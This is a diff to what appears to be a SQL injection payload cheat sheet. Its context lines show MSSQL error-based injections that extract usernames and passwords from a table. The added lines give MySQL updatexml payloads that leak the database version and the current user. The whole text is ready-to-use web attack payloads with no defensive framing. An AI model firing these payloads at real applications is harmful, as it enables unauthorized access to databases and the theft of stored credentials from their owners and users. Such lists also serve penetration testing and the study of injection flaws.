@@ -169,6 +169,12 @@ a',convert(int,(SELECT name from DATABASE..syscolumns WHERE id = (SELECT id FROM
 a',convert(int,(SELECT username FROM DATABASE..TABLE ORDER BY username OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
 a',convert(int,(SELECT password FROM DATABASE..TABLE ORDER BY password OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)))--
 ```
+_Example of MySQL:_
+
+```
+AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-- -)
+AND updatexml(rand(),concat(CHAR(126),user(),CHAR(126)),null)-- -)
+```
 
 # Blind SQLi
 
